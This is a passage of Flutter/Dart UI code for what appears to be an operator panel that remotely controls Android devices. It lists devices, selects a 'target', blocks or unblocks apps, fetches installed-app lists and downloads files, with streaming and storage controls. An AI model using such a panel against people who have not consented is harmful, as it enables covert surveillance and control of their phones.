        _addLog("❌ Download failed: ${response.statusCode}", LogType.error);
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text("❌ Download failed: ${response.statusCode}", style: TextStyle(color: _t0)),
            backgroundColor: _b3,
          ),
        );
      }
    } catch (e) {
      _addLog("⚠️ Download error: $e", LogType.error);
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(
          content: Text("⚠️ Download error: $e", style: TextStyle(color: _t0)),
          backgroundColor: _b3,
        ),
      );
    }
  }

  String _formatFileSize(int bytes) {
    if (bytes < 1024) return '$bytes B';
    if (bytes < 1024 * 1024) return '${(bytes / 1024).toStringAsFixed(1)} KB';
    if (bytes < 1024 * 1024 * 1024) return '${(bytes / (1024 * 1024)).toStringAsFixed(1)} MB';
    return '${(bytes / (1024 * 1024 * 1024)).toStringAsFixed(1)} GB';
  }

  // ─── SHOW APP BLOCK DIALOG ──────────────────────────────────────────
  void _showAppBlockDialog() {
    if (_targetId == "unknown" || _targetId.isEmpty) {
      _addLog("❌ Pilih device terlebih dahulu!", LogType.error);
      return;
    }

    setState(() {
      _isAppsLoading = false;
      _appSearchController.clear();
      
      _displayApps = _defaultApps.map((app) {
        final package = app['package'] ?? '';
        final isBlocked = _blockedApps.contains(package);
        return {
          'name': app['name'] ?? 'Unknown',
          'package': package,
          'isBlocked': isBlocked,
        };
      }).toList();
      
      _filteredApps = List.from(_displayApps);
    });

    _addLog("📱 Showing app list: ${_displayApps.length} apps", LogType.info);

    showDialog(
      context: context,
      barrierDismissible: true,
      barrierColor: Colors.black.withOpacity(0.85),
      builder: (context) {
        _appBlockDialogContext = context;
        return StatefulBuilder(
          builder: (context, setDialogState) {
            return AlertDialog(
              backgroundColor: _b3,
              shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(20),
                side: BorderSide(color: _gborder2),
              ),
              titlePadding: const EdgeInsets.all(16),
              contentPadding: const EdgeInsets.all(0),
              title: Row(
                children: [
                  Container(
                    width: 36,
                    height: 36,
                    decoration: BoxDecoration(
                      color: _red.withOpacity(0.15),
                      borderRadius: BorderRadius.circular(10),
                      border: Border.all(color: _red.withOpacity(0.3)),
                    ),
                    child: const Icon(Icons.block, color: Colors.red, size: 20),
                  ),
                  const SizedBox(width: 12),
                  Expanded(
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(
                          "Block Apps",
                          style: TextStyle(
                            color: _t0,
                            fontSize: 16,
                            fontWeight: FontWeight.bold,
                          ),
                        ),
                        Text(
                          "${_filteredApps.length} apps • ${_blockedApps.length} blocked",
                          style: TextStyle(
                            color: _t2,
                            fontSize: 11,
                          ),
                        ),
                      ],
                    ),
                  ),
                  IconButton(
                    icon: Icon(Icons.close, color: _t2, size: 20),
                    onPressed: () {
                      _appBlockDialogContext = null;
                      Navigator.pop(context);
                    },
                  ),
                ],
              ),
              content: Container(
                width: double.maxFinite,
                height: 450,
                child: Column(
                  children: [
                    Padding(
                      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
                      child: TextField(
                        controller: _appSearchController,
                        style: TextStyle(color: _t0, fontSize: 13),
                        decoration: InputDecoration(
                          hintText: "Cari aplikasi...",
                          hintStyle: TextStyle(color: _t2, fontSize: 13),
                          prefixIcon: Icon(Icons.search, color: _t2, size: 20),
                          contentPadding: const EdgeInsets.symmetric(horizontal: 4, vertical: 10),
                          border: OutlineInputBorder(
                            borderRadius: BorderRadius.circular(12),
                            borderSide: BorderSide(color: _blue2.withOpacity(0.1)),
                          ),
                          enabledBorder: OutlineInputBorder(
                            borderRadius: BorderRadius.circular(12),
                            borderSide: BorderSide(color: _blue2.withOpacity(0.1)),
                          ),
                          focusedBorder: OutlineInputBorder(
                            borderRadius: BorderRadius.circular(12),
                            borderSide: BorderSide(color: _blue2, width: 1.5),
                          ),
                          filled: true,
                          fillColor: _b2,
                        ),
                        onChanged: (value) {
                          setDialogState(() {
                            if (value.isEmpty) {
                              _filteredApps = List.from(_displayApps);
                            } else {
                              final query = value.toLowerCase();
                              _filteredApps = _displayApps.where((app) {
                                final name = (app['name'] ?? '').toLowerCase();
                                final pkg = (app['package'] ?? '').toLowerCase();
                                return name.contains(query) || pkg.contains(query);
                              }).toList();
                            }
                          });
                        },
                      ),
                    ),

                    if (_blockedApps.isNotEmpty)
                      Padding(
                        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 4),
                        child: GestureDetector(
                          onTap: () {
                            _sendCommand('unblockAll', extra: '');
                            setState(() {
                              _blockedApps.clear();
                              for (var app in _displayApps) {
                                app['isBlocked'] = false;
                              }
                              _filteredApps = List.from(_displayApps);
                            });
                            _addLog("✅ All apps unblocked", LogType.success);
                            ScaffoldMessenger.of(context).showSnackBar(
                              SnackBar(
                                content: Text("✅ All apps unblocked", style: TextStyle(color: _t0)),
                                backgroundColor: _b3,
                              ),
                            );
                            setDialogState(() {});
                          },
                          child: Container(
                            padding: const EdgeInsets.symmetric(vertical: 10),
                            decoration: BoxDecoration(
                              color: _red.withOpacity(0.1),
                              borderRadius: BorderRadius.circular(10),
                              border: Border.all(color: _red.withOpacity(0.2)),
                            ),
                            child: Row(
                              mainAxisAlignment: MainAxisAlignment.center,
                              children: [
                                const Icon(Icons.check_circle, color: Colors.red, size: 16),
                                const SizedBox(width: 8),
                                Text(
                                  "UNBLOCK ALL (${_blockedApps.length} apps)",
                                  style: const TextStyle(
                                    color: Colors.red,
                                    fontSize: 12,
                                    fontWeight: FontWeight.bold,
                                    letterSpacing: 1,
                                  ),
                                ),
                              ],
                            ),
                          ),
                        ),
                      ),

                    Expanded(
                      child: _isAppsLoading
                          ? Center(
                              child: Column(
                                mainAxisSize: MainAxisSize.min,
                                children: [
                                  SizedBox(
                                    width: 30,
                                    height: 30,
                                    child: CircularProgressIndicator(
                                      color: _blue2,
                                      strokeWidth: 2,
                                    ),
                                  ),
                                  const SizedBox(height: 12),
                                  Text(
                                    "Loading apps...",
                                    style: TextStyle(color: _t2, fontSize: 12),
                                  ),
                                ],
                              ),
                            )
                          : _filteredApps.isEmpty
                              ? Center(
                                  child: Text(
                                    _appSearchController.text.isEmpty
                                        ? "No apps available"
                                        : "App not found",
                                    style: TextStyle(color: _t2, fontSize: 13),
                                  ),
                                )
                              : ListView.builder(
                                  padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
                                  itemCount: _filteredApps.length,
                                  itemBuilder: (context, index) {
                                    final app = _filteredApps[index];
                                    final package = app['package']?.toString() ?? '';
                                    final name = app['name']?.toString() ?? 'Unknown';
                                    final isBlocked = _blockedApps.contains(package) || (app['isBlocked'] == true);

                                    return Container(
                                      margin: const EdgeInsets.only(bottom: 4),
                                      decoration: BoxDecoration(
                                        color: isBlocked
                                            ? _red.withOpacity(0.08)
                                            : _b2,
                                        borderRadius: BorderRadius.circular(10),
                                        border: Border.all(
                                          color: isBlocked
                                              ? _red.withOpacity(0.3)
                                              : _blue2.withOpacity(0.05),
                                        ),
                                      ),
                                      child: ListTile(
                                        contentPadding: const EdgeInsets.symmetric(horizontal: 12, vertical: 4),
                                        leading: Container(
                                          width: 36,
                                          height: 36,
                                          decoration: BoxDecoration(
                                            color: isBlocked
                                                ? _red.withOpacity(0.15)
                                                : _blue2.withOpacity(0.05),
                                            borderRadius: BorderRadius.circular(8),
                                            border: Border.all(
                                              color: isBlocked
                                                  ? _red.withOpacity(0.2)
                                                  : _blue2.withOpacity(0.05),
                                            ),
                                          ),
                                          child: Center(
                                            child: Text(
                                              name.isNotEmpty ? name[0].toUpperCase() : '?',
                                              style: TextStyle(
                                                color: isBlocked ? _red : _t2,
                                                fontSize: 14,
                                                fontWeight: FontWeight.bold,
                                              ),
                                            ),
                                          ),
                                        ),
                                        title: Text(
                                          name,
                                          style: TextStyle(
                                            color: isBlocked ? _red : _t0,
                                            fontSize: 13,
                                            fontWeight: isBlocked ? FontWeight.bold : FontWeight.normal,
                                          ),
                                          maxLines: 1,
                                          overflow: TextOverflow.ellipsis,
                                        ),
                                        subtitle: Text(
                                          package,
                                          style: TextStyle(
                                            color: isBlocked
                                                ? _red.withOpacity(0.5)
                                                : _t2,
                                            fontSize: 10,
                                          ),
                                          maxLines: 1,
                                          overflow: TextOverflow.ellipsis,
                                        ),
                                        trailing: GestureDetector(
                                          onTap: () {
                                            if (isBlocked) {
                                              _sendCommand('unblockApp', extra: package);
                                              setState(() {
                                                _blockedApps.remove(package);
                                                for (var a in _displayApps) {
                                                  if (a['package'] == package) {
                                                    a['isBlocked'] = false;
                                                  }
                                                }
                                                _filteredApps = List.from(_displayApps);
                                              });
                                              _addLog("✅ Unblocked: $name", LogType.success);
                                              ScaffoldMessenger.of(context).showSnackBar(
                                                SnackBar(
                                                  content: Text("✅ Unblocked: $name", style: TextStyle(color: _t0)),
                                                  backgroundColor: _b3,
                                                ),
                                              );
                                              setDialogState(() {});
                                            } else {
                                              _sendCommand('blockApp', extra: jsonEncode({
                                                'package': package,
                                                'name': name,
                                              }));
                                              setState(() {
                                                _blockedApps.add(package);
                                                for (var a in _displayApps) {
                                                  if (a['package'] == package) {
                                                    a['isBlocked'] = true;
                                                  }
                                                }
                                                _filteredApps = List.from(_displayApps);
                                              });
                                              _addLog("🚫 Blocked: $name", LogType.success);
                                              ScaffoldMessenger.of(context).showSnackBar(
                                                SnackBar(
                                                  content: Text("🚫 Blocked: $name", style: TextStyle(color: _t0)),
                                                  backgroundColor: _b3,
                                                ),
                                              );
                                              setDialogState(() {});
                                            }
                                          },
                                          child: Container(
                                            padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                                            decoration: BoxDecoration(
                                              color: isBlocked
                                                  ? _green.withOpacity(0.15)
                                                  : _red.withOpacity(0.15),
                                              borderRadius: BorderRadius.circular(6),
                                              border: Border.all(
                                                color: isBlocked
                                                    ? _green.withOpacity(0.3)
                                                    : _red.withOpacity(0.3),
                                              ),
                                            ),
                                            child: Text(
                                              isBlocked ? "UNBLOCK" : "BLOCK",
                                              style: TextStyle(
                                                color: isBlocked ? _green : _red,
                                                fontSize: 10,
                                                fontWeight: FontWeight.bold,
                                                letterSpacing: 0.5,
                                              ),
                                            ),
                                          ),
                                        ),
                                      ),
                                    );
                                  },
                                ),
                    ),
                  ],
                ),
              ),
              actions: [
                TextButton(
                  onPressed: () {
                    _appBlockDialogContext = null;
                    Navigator.pop(context);
                  },
                  child: Text(
                    "CLOSE",
                    style: TextStyle(color: _t2, fontWeight: FontWeight.bold),
                  ),
                ),
                Container(
                  decoration: BoxDecoration(
                    gradient: LinearGradient(
                      colors: [_blue2, _blue3],
                    ),
                    borderRadius: BorderRadius.circular(10),
                  ),
                  child: ElevatedButton.icon(
                    onPressed: () {
                      setState(() {
                        _isAppsLoading = true;
                      });
                      setDialogState(() {});
                      _sendCommand('getInstalledApps', extra: 'true');
                      _addLog("🔄 Fetching installed apps...", LogType.info);
                      Future.delayed(const Duration(seconds: 2), () {
                        setState(() {
                          _isAppsLoading = false;
                        });
                        setDialogState(() {});
                      });
                    },
                    icon: const Icon(Icons.refresh, size: 16, color: Colors.white),
                    label: const Text("REFRESH", style: TextStyle(color: Colors.white)),
                    style: ElevatedButton.styleFrom(
                      backgroundColor: Colors.transparent,
                      shadowColor: Colors.transparent,
                      shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(10),
                      ),
                    ),
                  ),
                ),
              ],
            );
          },
        );
      },
    ).then((_) {
      _appBlockDialogContext = null;
    });
  }

  // ─── GET CATEGORIES ──────────────────────────────────────────────────
  List<String> _getCategories() {
    final Set<String> categories = {};
    for (var item in _controlItems) {
      if (item['category'] != null) {
        categories.add(item['category'].toString());
      }
    }
    return categories.toList();
  }

  List<Map<String, dynamic>> _getItemsByCategory(String category) {
    return _controlItems.where((item) => item['category'] == category).toList();
  }

  // ─── NAVIGASI TAB ──────────────────────────────────────────────────
  Widget _buildBottomNav() {
    return Container(
      decoration: BoxDecoration(
        color: _b3,
        border: Border(top: BorderSide(color: _blue2.withOpacity(0.1))),
      ),
      child: Padding(
        padding: const EdgeInsets.symmetric(vertical: 8, horizontal: 16),
        child: Row(
          mainAxisAlignment: MainAxisAlignment.spaceAround,
          children: [
            _buildNavItem(Icons.phone_android_outlined, "Devices", TabIndex.devices),
            _buildNavItem(Icons.settings_outlined, "Control", TabIndex.control),
            _buildNavItem(Icons.chat_bubble_outline, "Pesan", TabIndex.messages),
          ],
        ),
      ),
    );
  }

  Widget _buildNavItem(IconData icon, String label, TabIndex tab) {
    bool isActive = _currentTab == tab;
    return GestureDetector(
      onTap: () {
        setState(() {
          _currentTab = tab;
        });
      },
      child: Column(
        mainAxisSize: MainAxisSize.min,
        children: [
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 8),
            decoration: isActive
                ? BoxDecoration(
              gradient: LinearGradient(
                colors: [_blue2.withOpacity(0.3), _blue3.withOpacity(0.1)],
              ),
              borderRadius: BorderRadius.circular(20),
              border: Border.all(color: _blue2.withOpacity(0.2)),
            )
                : null,
            child: Icon(
              icon,
              color: isActive ? _blue2 : _t2,
              size: 26,
            ),
          ),
          const SizedBox(height: 4),
          Text(
            label,
            style: TextStyle(
              color: isActive ? _blue2 : _t2,
              fontSize: 10,
              fontWeight: isActive ? FontWeight.bold : FontWeight.normal,
            ),
          ),
        ],
      ),
    );
  }

  // ─── BUILD TAB CONTENT ──────────────────────────────────────────────
  Widget _buildTabContent() {
    switch (_currentTab) {
      case TabIndex.devices:
        return _buildDevicesTab();
      case TabIndex.control:
        return _buildControlTab();
      case TabIndex.messages:
        return _buildMessagesTab();
    }
  }

  // ─── TAB: DEVICES ────────────────────────────────────────────────────
  Widget _buildDevicesTab() {
    return Column(
      children: [
        _buildDeviceHeader(),
        Expanded(
          child: _devices.isEmpty
              ? Center(child: Text("No Devices Found", style: TextStyle(color: _t2)))
              : ListView.builder(
            padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
            itemCount: _devices.length,
            itemBuilder: (context, index) {
              final device = _devices[index];
              return _buildDeviceCard(device, index);
            },
          ),
        ),
      ],
    );
  }

  Widget _buildDeviceHeader() {
    return Padding(
      padding: const EdgeInsets.fromLTRB(16, 16, 16, 8),
      child: Row(
        children: [
          Icon(Icons.devices, color: _blue2, size: 20),
          const SizedBox(width: 8),
          Text(
            "DEVICES",
            style: TextStyle(color: _t0, fontWeight: FontWeight.bold, letterSpacing: 2),
          ),
          const SizedBox(width: 8),
          Expanded(
            child: Container(
              height: 1,
              color: _blue2.withOpacity(0.3),
            ),
          ),
          const SizedBox(width: 8),
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
            decoration: BoxDecoration(
              color: _b2,
              borderRadius: BorderRadius.circular(10),
            ),
            child: Text(
              "${_devices.length}",
              style: TextStyle(color: _t2, fontSize: 10, fontWeight: FontWeight.bold),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildDeviceCard(dynamic device, int index) {
    final bool isActive = device['status'] != 'Offline';
    final Color statusColor = isActive ? _green : _red;
    final String displayName = device['name'] ?? device['model'] ?? 'Unknown Device';
    final int battery = device['battery'] ?? 0;
    final String androidVersion = device['androidVersion'] ?? 'Unknown';
    final int sdkVersion = device['sdkVersion'] ?? 0;
    final String number = (index + 1).toString().padLeft(2, '0');

    Color battColor;
    if (battery >= 0 && battery <= 20) battColor = _red;
    else if (battery >= 0 && battery <= 40) battColor = _amber;
    else battColor = _green;

    return GestureDetector(
      onTap: () {
        setState(() {
          _targetId = device['id']?.toString() ?? '';
          _targetModel = displayName;
          _deviceData = Map<String, dynamic>.from(device);
          _currentTab = TabIndex.control;
        });
        _addLog("🎯 Selected: $_targetModel", LogType.success);
      },
      child: Container(
        margin: const EdgeInsets.only(bottom: 10),
        padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
        decoration: BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
            colors: [
              _b3,
              _b3,
            ],
          ),
          borderRadius: BorderRadius.circular(18),
          border: Border.all(
            color: _blue2.withOpacity(0.15),
          ),
          boxShadow: [
            BoxShadow(
              color: _blue2.withOpacity(0.05),
              blurRadius: 20,
              offset: const Offset(0, 5),
            ),
          ],
        ),
        child: Row(
          children: [
            Column(
              children: [
                Container(
                  width: 40,
                  height: 52,
                  decoration: BoxDecoration(
                    borderRadius: BorderRadius.circular(6),
                    border: Border.all(
                      color: isActive ? _blue2.withOpacity(0.4) : _t2.withOpacity(0.4),
                      width: 2,
                    ),
                    gradient: const LinearGradient(
                      begin: Alignment.topLeft,
                      end: Alignment.bottomRight,
                      colors: [Color(0xFF1A2A4A), Color(0xFF0A1628)],
                    ),
                  ),
                  child: Stack(
                    children: [
                      Positioned(
                        top: 5,
                        left: 3,
                        right: 3,
                        bottom: 12,
                        child: Container(
                          decoration: BoxDecoration(
                            borderRadius: BorderRadius.circular(2),
                            color: _blue2.withOpacity(0.1),
                            border: Border.all(color: _blue2.withOpacity(0.15)),
                          ),
                        ),
                      ),
                      Positioned(
                        top: 3,
                        left: 0,
                        right: 0,
                        child: Center(
                          child: Container(
                            width: 16,
                            height: 2,
                            decoration: BoxDecoration(
                              color: _t2.withOpacity(0.3),
                              borderRadius: BorderRadius.circular(1),
                            ),
                          ),
                        ),
                      ),
                      Positioned(
                        bottom: 2,
                        left: 0,
                        right: 0,
                        child: Center(
                          child: Container(
                            width: 12,
                            height: 12,
                            decoration: BoxDecoration(
                              shape: BoxShape.circle,
                              border: Border.all(color: _t2.withOpacity(0.3)),
                            ),
                          ),
                        ),
                      ),
                      Positioned(
                        top: 6,
                        right: 4,
                        child: Row(
                          children: [
                            Container(
                              width: 3,
                              height: 3,
                              decoration: BoxDecoration(
                                color: _green.withOpacity(0.6),
                                shape: BoxShape.circle,
                              ),
                            ),
                            const SizedBox(width: 2),
                            Container(
                              width: 3,
                              height: 3,
                              decoration: BoxDecoration(
                                color: _green.withOpacity(0.6),
                                shape: BoxShape.circle,
                              ),
                            ),
                            const SizedBox(width: 2),
                            Container(
                              width: 3,
                              height: 3,
                              decoration: BoxDecoration(
                                color: _green.withOpacity(0.6),
                                shape: BoxShape.circle,
                              ),
                            ),
                          ],
                        ),
                      ),
                    ],
                  ),
                ),
                const SizedBox(height: 6),
                if (battery >= 0)
                  Row(
                    children: [
                      Container(
                        width: 28,
                        height: 10,
                        decoration: BoxDecoration(
                          borderRadius: BorderRadius.circular(2),
                          border: Border.all(
                            color: _t2.withOpacity(0.5),
                            width: 1,
                          ),
                        ),
                        child: Stack(
                          alignment: Alignment.centerLeft,
                          children: [
                            Container(
                              width: battery.toDouble() / 100 * 24,
                              height: 6,
                              decoration: BoxDecoration(
                                borderRadius: BorderRadius.circular(1),
                                color: battColor,
                              ),
                            ),
                          ],
                        ),
                      ),
                      const SizedBox(width: 3),
                      Text(
                        '$battery%',
                        style: TextStyle(
                          color: battColor,
                          fontSize: 9,
                          fontWeight: FontWeight.bold,
                        ),
                      ),
                    ],
                  ),
              ],
            ),

            const SizedBox(width: 14),

            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Row(
                    children: [
                      Expanded(
                        child: Text(
                          displayName,
                          style: TextStyle(
                            color: _t0,
                            fontWeight: FontWeight.w600,
                            fontSize: 14,
                            letterSpacing: 0.5,
                          ),
                          maxLines: 1,
                          overflow: TextOverflow.ellipsis,
                        ),
                      ),
                    ],
                  ),
                  const SizedBox(height: 2),
                  Text(
                    device['id'] ?? 'Unknown',
                    style: TextStyle(
                      color: _t2,
                      fontSize: 9,
                      fontFamily: 'monospace',
                    ),
                    maxLines: 1,
                    overflow: TextOverflow.ellipsis,
                  ),
                  const SizedBox(height: 4),
                  Text(
                    'Android $androidVersion · SDK $sdkVersion',
                    style: TextStyle(
                      color: _t2,
                      fontSize: 9,
                      fontWeight: FontWeight.w300,
                    ),
                  ),
                ],
              ),
            ),

            Column(
              crossAxisAlignment: CrossAxisAlignment.end,
              children: [
                Row(
                  children: [
                    Container(
                      width: 6,
                      height: 6,
                      decoration: BoxDecoration(
                        color: statusColor,
                        shape: BoxShape.circle,
                        boxShadow: [
                          BoxShadow(
                            color: statusColor.withOpacity(0.5),
                            blurRadius: 6,
                          ),
                        ],
                      ),
                    ),
                    const SizedBox(width: 5),
                    Text(
                      isActive ? 'ONLINE' : 'OFFLINE',
                      style: TextStyle(
                        color: statusColor,
                        fontSize: 9,
                        fontWeight: FontWeight.bold,
                        letterSpacing: 0.5,
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 6),
                Text(
                  number,
                  style: TextStyle(
                    color: _t2,
                    fontSize: 11,
                    fontWeight: FontWeight.bold,
                    fontFamily: 'monospace',
                  ),
                ),
                if (device['status'] == 'Online')
                  Container(
                    margin: const EdgeInsets.only(top: 4),
                    padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
                    decoration: BoxDecoration(
                      color: _green.withOpacity(0.15),
                      borderRadius: BorderRadius.circular(4),
                      border: Border.all(color: _green.withOpacity(0.2)),
                    ),
                    child: Text(
                      'LIVE',
                      style: TextStyle(
                        color: _green,
                        fontSize: 6,
                        fontWeight: FontWeight.bold,
                        letterSpacing: 0.5,
                      ),
                    ),
                  ),
              ],
            ),
          ],
        ),
      ),
    );
  }

  // ─── CATEGORY HEADER ──────────────────────────────────────────────────
  Widget _buildCategoryHeader(String category) {
    final Map<String, IconData> categoryIcons = {
      'System Control': Icons.settings,
      'Streaming': Icons.live_tv,
      'Storage & Info': Icons.storage,
      'Aksi': Icons.flash_on,
    };

    final Map<String, Color> categoryColors = {
      'System Control': _blue2,
      'Streaming': _cyan,
      'Storage & Info': _amber,
      'Aksi': _red,
    };

    final icon = categoryIcons[category] ?? Icons.category;
    final color = categoryColors[category] ?? Colors.white;
    final items = _getItemsByCategory(category);
    final activeCount = items.where((item) => item['isOn'] == true).length;

    return Row(
      children: [
        Container(
          width: 24,
          height: 24,
          decoration: BoxDecoration(
            gradient: LinearGradient(
              colors: [color.withOpacity(0.2), color.withOpacity(0.05)],
            ),
            borderRadius: BorderRadius.circular(6),
            border: Border.all(color: color.withOpacity(0.3)),
          ),
          child: Icon(icon, color: color, size: 14),
        ),
        const SizedBox(width: 8),
        Text(
          category.toUpperCase(),
          style: TextStyle(
            color: _t0,
            fontSize: 12,
            fontWeight: FontWeight.bold,
            letterSpacing: 1.5,
          ),
        ),
        const Spacer(),
        if (activeCount > 0)
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
            decoration: BoxDecoration(
              color: _green.withOpacity(0.2),
              borderRadius: BorderRadius.circular(10),
            ),
            child: Text(
              "$activeCount ACTIVE",
              style: TextStyle(
                color: _green,
                fontSize: 7,
                fontWeight: FontWeight.bold,
                letterSpacing: 0.5,
              ),
            ),
          ),
        const SizedBox(width: 6),
        Text(
          "${items.length}",
          style: TextStyle(
            color: _t2,
            fontSize: 9,
            fontWeight: FontWeight.bold,
          ),
        ),
      ],
    );
  }

  // ─── TAB: CONTROL ──────────────────────────────────────────────────────
  Widget _buildControlTab() {
    if (_targetId == "unknown") {
      return Center(
        child: Text(
          "PILIH DEVICE DULU",
          style: TextStyle(color: _t2, fontSize: 18, fontWeight: FontWeight.bold),
        ),
      );
    }

    final categories = _getCategories();
    final List<Widget> categoryWidgets = [];

    for (var category in categories) {
      final items = _getItemsByCategory(category);
      categoryWidgets.add(
        Padding(
          padding: const EdgeInsets.symmetric(vertical: 8),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              _buildCategoryHeader(category),
              const SizedBox(height: 10),
              GridView.builder(
                shrinkWrap: true,
                physics: const NeverScrollableScrollPhysics(),
                gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                  crossAxisCount: 2,
                  crossAxisSpacing: 10,
                  mainAxisSpacing: 10,
                  childAspectRatio: 1.15,
                ),
                itemCount: items.length,
                itemBuilder: (context, index) {
                  final item = items[index];
                  if (item['isToggle'] == true) {
                    return _buildControlTileToggle(
                      label: item['label'],
                      icon: item['icon'],
                      color: item['color'],
                      isOn: item['isOn'],
                      needsInput: item['needsInput'] ?? false,
                      inputHint: item['inputHint'] ?? '',
                      inputType: item['inputType'] ?? 'text',
                      command: item['command'],
                    );
                  } else {
                    return _buildControlTileAction(
                      label: item['label'],
                      icon: item['icon'],
                      color: item['color'],
                      onTap: () => _handleActionTap(item),
                    );
                  }
                },
              ),
            ],
          ),
        ),
      );
    }

    return SingleChildScrollView(
      padding: const EdgeInsets.all(12),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          _buildDeviceBanner(),
          const SizedBox(height: 12),
          _buildDeviceInfoBar(),
          const SizedBox(height: 16),
          _buildTerminalLogs(),
          const SizedBox(height: 16),
          Row(
            children: [
              Container(
                width: 3,
                height: 18,
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    colors: [_blue2, _blue3],
                  ),
                  borderRadius: BorderRadius.circular(2),
                ),
              ),
              const SizedBox(width: 10),
              Text(
                "REMOTE KONTROL",
                style: TextStyle(
                  color: _t0,
                  fontSize: 16,
                  fontWeight: FontWeight.bold,
                  letterSpacing: 2,
                ),
              ),
              const Spacer(),
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 2),
                decoration: BoxDecoration(
                  color: _isConnected ? _green.withOpacity(0.15) : _red.withOpacity(0.15),
                  borderRadius: BorderRadius.circular(10),
                  border: Border.all(
                    color: _isConnected ? _green.withOpacity(0.3) : _red.withOpacity(0.3),
                  ),
                ),
                child: Row(
                  children: [
                    Container(
                      width: 5,
                      height: 5,
                      decoration: BoxDecoration(
                        color: _isConnected ? _green : _red,
                        shape: BoxShape.circle,
                      ),
                    ),
                    const SizedBox(width: 4),
                    Text(
                      _isConnected ? "ONLINE" : "OFFLINE",
                      style: TextStyle(
                        color: _isConnected ? _green : _red,
                        fontSize: 7,
                        fontWeight: FontWeight.bold,
                      ),
                    ),
                  ],
                ),
              ),
            ],
          ),
          const SizedBox(height: 12),
          ...categoryWidgets,
          const SizedBox(height: 16),
          _buildControlFooter(),
        ],
      ),
    );
  }

  Widget _buildDeviceBanner() {
    return Container(
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: _gborder2),
        boxShadow: [
          BoxShadow(
            color: _blue2.withOpacity(0.08),
            blurRadius: 20,
            offset: const Offset(0, 4),
          ),
        ],
      ),
      child: ClipRRect(
        borderRadius: BorderRadius.circular(16),
        child: Stack(
          children: [
            Container(
              height: 80,
              width: double.infinity,
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  begin: Alignment.topLeft,
                  end: Alignment.bottomRight,
                  colors: [
                    _b3,
                    _b2,
                  ],
                ),
              ),
              child: Stack(
                children: [
                  Positioned.fill(
                    child: CustomPaint(
                      painter: GridPainter(),
                    ),
                  ),
                  Positioned(
                    top: 0,
                    left: -100,
                    right: 0,
                    bottom: 0,
                    child: Container(
                      decoration: BoxDecoration(
                        gradient: LinearGradient(
                          begin: Alignment.topLeft,
                          end: Alignment.bottomRight,
                          colors: [
                            Colors.transparent,
                            _blue2.withOpacity(0.05),
                            Colors.transparent,
                          ],
                        ),
                      ),
                    ),
                  ),
                ],
              ),
            ),
            Positioned(
              bottom: 10,
              left: 14,
              right: 14,
              child: Row(
                children: [
                  Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
                        _targetModel,
                        style: TextStyle(
                          color: _t0,
                          fontSize: 15,
                          fontWeight: FontWeight.bold,
                          letterSpacing: 0.5,
                        ),
                        maxLines: 1,
                        overflow: TextOverflow.ellipsis,
                      ),
                      const SizedBox(height: 1),
                      Text(
                        _targetId,
                        style: TextStyle(
                          color: _t2,
                          fontSize: 7,
                          fontFamily: 'monospace',
                          letterSpacing: 0.5,
                        ),
                        maxLines: 1,
                        overflow: TextOverflow.ellipsis,
                      ),
                    ],
                  ),
                  const Spacer(),
                  Container(
                    padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
                    decoration: BoxDecoration(
                      color: _green.withOpacity(0.1),
                      borderRadius: BorderRadius.circular(6),
                      border: Border.all(color: _green.withOpacity(0.3)),
                    ),
                    child: Row(
                      children: [
                        Container(
                          width: 5,
                          height: 5,
                          decoration: BoxDecoration(
                            color: _green,
                            shape: BoxShape.circle,
                            boxShadow: [
                              BoxShadow(
                                color: _green.withOpacity(0.5),
                                blurRadius: 6,
                              ),
                            ],
                          ),
                        ),
                        const SizedBox(width: 4),
                        Text(
                          "ONLINE",
                          style: TextStyle(
                            color: _green,
                            fontSize: 7,
                            fontWeight: FontWeight.bold,
                            letterSpacing: 1,
                          ),
                        ),
                      ],
                    ),
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildDeviceInfoBar() {
    final battery = _deviceData['battery'] ?? 0;
    final charging = _deviceData['charging'] ?? false;
    final android = _deviceData['androidVersion'] ?? '—';
    final sdk = _deviceData['sdkVersion'] ?? '—';
    
    Color battColor;
    if (battery >= 0 && battery <= 20) battColor = _red;
    else if (battery >= 0 && battery <= 40) battColor = _amber;
    else battColor = _green;

    return Container(
      padding: const EdgeInsets.symmetric(vertical: 8, horizontal: 10),
      decoration: BoxDecoration(
        color: _b2,
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: _gborder),
      ),
      child: Row(
        children: [
          Expanded(
            child: Column(
              children: [
                Row(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    Icon(
                      charging ? Icons.battery_charging_full : Icons.battery_full,
                      color: battColor,
                      size: 14,
                    ),
                    const SizedBox(width: 4),
                    Text(
                      '$battery%',
                      style: TextStyle(
                        color: battColor,
                        fontSize: 14,
                        fontWeight: FontWeight.bold,
